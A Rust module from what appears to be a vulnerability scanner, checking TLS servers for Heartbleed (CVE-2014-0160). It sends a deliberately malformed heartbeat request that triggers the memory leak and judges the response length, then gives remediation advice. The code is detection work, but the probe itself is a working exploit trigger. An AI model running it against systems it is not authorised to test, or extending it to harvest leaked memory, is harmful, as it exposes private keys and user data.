/// Heartbleed Vulnerability Checker (CVE-2014-0160)
///
/// Tests for the OpenSSL Heartbleed vulnerability which allows
/// attackers to read server memory via malformed TLS heartbeat requests.
///
/// This is a CRITICAL vulnerability that can leak private keys and user data.

use super::{VulnChecker, VulnCheckResult, Severity, connect_tcp, tls_types, build_client_hello};
use std::io::{Read, Write};
use std::time::Duration;

pub struct HeartbleedChecker {
    timeout: Duration,
}

impl HeartbleedChecker {
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(10),
        }
    }

    /// Build a malicious heartbeat request
    fn build_heartbeat_request(&self) -> Vec<u8> {
        let mut heartbeat = Vec::new();

        // TLS record header
        heartbeat.push(tls_types::CONTENT_TYPE_HEARTBEAT);
        heartbeat.extend_from_slice(&tls_types::VERSION_TLS12);

        // Heartbeat message length (3 bytes for type + length + minimal payload)
        heartbeat.push(0x00);
        heartbeat.push(0x03);

        // Heartbeat message
        heartbeat.push(0x01); // Heartbeat request type

        // Malicious payload length - request 16KB but send only 1 byte
        // This is what triggers the vulnerability
        heartbeat.push(0x40); // 16384 >> 8
        heartbeat.push(0x00); // 16384 & 0xff

        heartbeat
    }

    /// Check if response indicates Heartbleed vulnerability
    fn analyze_response(&self, response: &[u8]) -> bool {
        // Heartbleed vulnerable servers will respond with heartbeat response
        // containing more data than we sent

        if response.len() < 5 {
            return false;
        }

        // Check for heartbeat response
        if response[0] == tls_types::CONTENT_TYPE_HEARTBEAT {
            // Get the length of the heartbeat response
            let length = ((response[3] as usize) << 8) | (response[4] as usize);

            // If we get back more than we sent, it's vulnerable
            // We only sent 3 bytes but if vulnerable, server returns 16KB
            if length > 10 {
                return true;
            }
        }

        false
    }
}

impl Default for HeartbleedChecker {
    fn default() -> Self {
        Self::new()
    }
}

impl VulnChecker for HeartbleedChecker {
    fn name(&self) -> &str {
        "Heartbleed"
    }

    fn cve(&self) -> Option<&str> {
        Some("CVE-2014-0160")
    }

    fn description(&self) -> &str {
        "OpenSSL TLS heartbeat memory disclosure vulnerability"
    }

    fn check(&self, host: &str, port: u16) -> VulnCheckResult {
        // Establish connection
        let mut stream = match connect_tcp(host, port, self.timeout) {
            Ok(s) => s,
            Err(e) => return VulnCheckResult::error(self.name(), &e),
        };

        // Build and send ClientHello with heartbeat extension
        let heartbeat_extension = vec![
            0x00, 0x0f, // Extension type: heartbeat (15)
            0x00, 0x01, // Extension length
            0x01,       // Mode: peer_allowed_to_send
        ];

        let cipher_suites = vec![
            0x002f, // TLS_RSA_WITH_AES_128_CBC_SHA
            0x0035, // TLS_RSA_WITH_AES_256_CBC_SHA
            0x000a, // TLS_RSA_WITH_3DES_EDE_CBC_SHA
        ];

        let client_hello = build_client_hello(tls_types::VERSION_TLS12, &cipher_suites, &heartbeat_extension);

        if let Err(e) = stream.write_all(&client_hello) {
            return VulnCheckResult::error(self.name(), &format!("Failed to send ClientHello: {}", e));
        }

        // Read ServerHello (we need to complete enough handshake)
        let mut buffer = vec![0u8; 4096];
        let mut total_read = 0;

        // Read until we get ServerHelloDone or timeout
        loop {
            match stream.read(&mut buffer[total_read..]) {
                Ok(0) => break,
                Ok(n) => {
                    total_read += n;
                    // Check if we have ServerHelloDone
                    if total_read > 5 && self.contains_server_hello_done(&buffer[..total_read]) {
                        break;
                    }
                    if total_read >= buffer.len() - 100 {
                        break;
                    }
                }
                Err(_) => break,
            }
        }

        // Send malicious heartbeat request
        let heartbeat_request = self.build_heartbeat_request();
        if let Err(e) = stream.write_all(&heartbeat_request) {
            return VulnCheckResult::error(self.name(), &format!("Failed to send heartbeat: {}", e));
        }

        // Read heartbeat response
        let mut response = vec![0u8; 65536];
        match stream.read(&mut response) {
            Ok(n) if n > 0 => {
                if self.analyze_response(&response[..n]) {
                    return VulnCheckResult::vulnerable(
                        self.name(),
                        self.cve(),
                        Severity::Critical,
                        "Server responded to malicious heartbeat request with leaked memory. \
                         This allows attackers to read server memory including private keys, \
                         session tokens, and user data.",
                        "Update OpenSSL to version 1.0.1g or later. Regenerate SSL certificates \
                         and revoke old ones. Reset all user passwords that may have been compromised."
                    ).with_evidence(vec![
                        format!("Heartbeat response length: {} bytes", n),
                        "Server returned more data than requested".to_string(),
                    ]);
                }
            }
            _ => {}
        }

        VulnCheckResult::not_vulnerable(self.name(), self.cve())
    }
}

impl HeartbleedChecker {
    fn contains_server_hello_done(&self, data: &[u8]) -> bool {
        // Look for ServerHelloDone (type 14) in the handshake
        let mut pos = 0;
        while pos + 5 < data.len() {
            let content_type = data[pos];
            let length = ((data[pos + 3] as usize) << 8) | (data[pos + 4] as usize);

            if content_type == tls_types::CONTENT_TYPE_HANDSHAKE && pos + 5 + length <= data.len() {
                // Check handshake type
                if length > 0 && data[pos + 5] == tls_types::HANDSHAKE_TYPE_SERVER_HELLO_DONE {
                    return true;
                }
            }

            pos += 5 + length;
        }
        false
    }
}
